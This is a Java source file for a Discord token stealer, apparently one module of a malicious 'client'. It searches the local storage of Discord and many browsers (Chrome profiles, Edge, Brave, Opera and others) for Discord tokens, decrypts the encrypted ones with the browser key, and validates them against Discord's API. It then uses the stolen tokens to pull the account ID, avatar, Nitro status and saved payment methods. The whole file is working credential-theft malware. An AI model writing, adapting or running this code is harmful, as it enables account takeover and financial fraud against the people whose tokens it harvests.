package dev.client.module.applications.discord;

import com.google.gson.*;


import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import dev.client.utils.client.DecryptUtil;
import dev.client.utils.client.KeyUtil;

public class Discord {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final Pattern tokenRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static final Pattern encTokenRegex = Pattern.compile("dQw4w9WgXcQ:[^\"]*");

    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Discord", appData + "\\discord\\Local Storage\\leveldb");
            put("Discord Canary", appData + "\\discordcanary\\Local Storage\\leveldb");
            put("Discord PTB", appData + "\\discordptb\\Local Storage\\leveldb");
            put("Lightcord", appData + "\\Lightcord\\Local Storage\\leveldb");
            put("Opera", appData + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb");
            put("Amigo", localAppData + "\\Amigo\\User Data\\Local Storage\\leveldb");
            put("Torch", localAppData + "\\Torch\\User Data\\Local Storage\\leveldb");
            put("Kometa", localAppData + "\\Kometa\\User Data\\Local Storage\\leveldb");
            put("Orbitum", localAppData + "\\Orbitum\\User Data\\Local Storage\\leveldb");
            put("CentBrowser", localAppData + "\\CentBrowser\\User Data\\Local Storage\\leveldb");
            put("7Star", localAppData + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb");
            put("Sputnik", localAppData + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb");
            put("Chrome SxS", localAppData + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
            put("Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
            put("Chrome1", localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb");
            put("Chrome2", localAppData + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb");
            put("Chrome3", localAppData + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb");
            put("Chrome4", localAppData + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb");
            put("Chrome5", localAppData + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb");
            put("Epic Privacy Browser", localAppData + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb");
            put("Uran", localAppData + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
            put("Iridium", localAppData + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb");
        }
    };
    private final Vector<String> tokens = new Vector<String>();

    public List<String> getValidTokensList() {
        steal();
        Iterator<String> iterator = tokens.iterator();
        while (iterator.hasNext()) {
            String token = iterator.next();
            try {
                URL url = new URL("https://discord.com/api/v9/users/@me");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestProperty("Authorization", token);
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
                int responseCode = connection.getResponseCode();
                if (responseCode != 200) {
                    iterator.remove();
                }
                connection.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        List<String> validTokensList = new ArrayList<>();
        for (String token : tokens) {
            validTokensList.add(token);
        }

        return validTokensList;
    }



    private void steal() {
        for (String key : paths.keySet()) {
            File path = new File(paths.get(key));
            if(!path.exists()) continue;
            if (key.contains("iscord")) {
                decrypt(path);
            }
            stealDecrypted(path);
        }
    }
    private void decrypt(File path) {
        try {
            File localState = new File(path.getParentFile().getParentFile(), "Local State");
            byte[] key = KeyUtil.getKey(localState);
            for (File file : path.listFiles()) {
                for (String encToken: regexFile(encTokenRegex, file)) {
                    String token = DecryptUtil.decrypt(Base64.getDecoder().decode(encToken.replace("dQw4w9WgXcQ:","").getBytes()), key);
                    if (this.tokens.contains(token)) continue;
                    this.tokens.add(token);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    private void stealDecrypted(File path) {
        for (File file : path.listFiles()) {
            for (String token : regexFile(tokenRegex, file)) {
                if (this.tokens.contains(token)) continue;
                this.tokens.add(token);
            }
        }
    }


    private static Vector<String> regexFile(Pattern pattern, File file) {
        Vector<String> result = new Vector<String>();
        try {
            BufferedReader reader = new BufferedReader(new FileReader(file));
            StringBuilder content = new StringBuilder();
            while (reader.ready()) {
                content.append(reader.readLine());
            }
            reader.close();
            Matcher licker = pattern.matcher(content.toString());
            while (licker.find() && !result.contains(licker.group())) {
                result.add(licker.group());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

    private String getContentFromURL(String link, String token) {
        try {
            URL url = new URL(link);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.addRequestProperty("Content-Type", "application/json");
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            httpURLConnection.addRequestProperty("Authorization", token);
            httpURLConnection.connect();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) stringBuilder.append(line).append("\n");
            bufferedReader.close();
            return stringBuilder.toString();
        } catch (Exception ignored) {
            return "";
        }
    }

    public String getInfo(String info, String token) {
        StringBuilder result = new StringBuilder();
        try {
            String url = getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
            JsonParser parser = new JsonParser();
            JsonObject user = parser.parse(url).getAsJsonObject();

            if (user.has(info) && !user.get(info).isJsonNull()) {
                String infoValue = user.get(info).getAsString();
                result.append(infoValue);
            } else {
                result.append("N/A");
            }
        } catch (Exception ignored) {
        }

        return result.toString();
    }
    public String getAvatar(String token) throws IOException {
        String gif = "https://cdn.discordapp.com/avatars/" + getInfo("id", token) + "/" + getInfo("avatar", token) + ".gif";
        String png = "https://cdn.discordapp.com/avatars/" + getInfo("id", token) + "/" + getInfo("avatar", token) + ".png";
        URL urlGIF = new URL(gif);
        HttpURLConnection connectionGif = (HttpURLConnection) urlGIF.openConnection();
        connectionGif.setRequestMethod("HEAD");
        if (connectionGif.getResponseCode() == HttpURLConnection.HTTP_OK) {
            return gif; // Return GIF URL if it exists
        }
        URL urlPNG = new URL(png);
        HttpURLConnection connectionPNG = (HttpURLConnection) urlPNG.openConnection();
        connectionPNG.setRequestMethod("HEAD");
        if (connectionPNG.getResponseCode() == HttpURLConnection.HTTP_OK) {
            return png; // Return PNG URL if it exists
        }

        return "https://cdn.discordapp.com/embed/avatars/0.png"; // Default URL
    }

    public String getNitro(String token) {
        StringBuilder result = new StringBuilder();
        String url = getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
        JsonParser parser = new JsonParser();
        JsonObject user = parser.parse(url).getAsJsonObject();

        String nitro = "```None```";
        if (user.has("premium_type")) {
            int premiumType = user.get("premium_type").getAsInt();
            if (premiumType == 1) {
                nitro = "<:nitro:1146680991369404499>";
            } else if (premiumType == 2) {
                nitro = "<:nitro:1146680991369404499><:boost:1146680993386864742>";
                }
        }
        result.append(nitro);
        return result.toString();
    }

    public String getBilling(String token) {
        StringBuilder result = new StringBuilder();
            String paymentMethodString = getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token);
            JsonParser parser = new JsonParser();
            JsonArray paymentSources = parser.parse(paymentMethodString).getAsJsonArray();

            for (JsonElement source : paymentSources) {
                JsonObject paymentSource = source.getAsJsonObject();
                int type = paymentSource.get("type").getAsInt();
                String paymentType = "";
                if (type == 1) {
                    paymentType = ":credit_card:";
                } else if (type == 2) {
                    paymentType = "<:pp:1146680274353135627>";
                }
                result.append(paymentType);
            }
        if (result.length() == 0) {
            result.append("```None```");
        }

        return result.toString();
    }

}
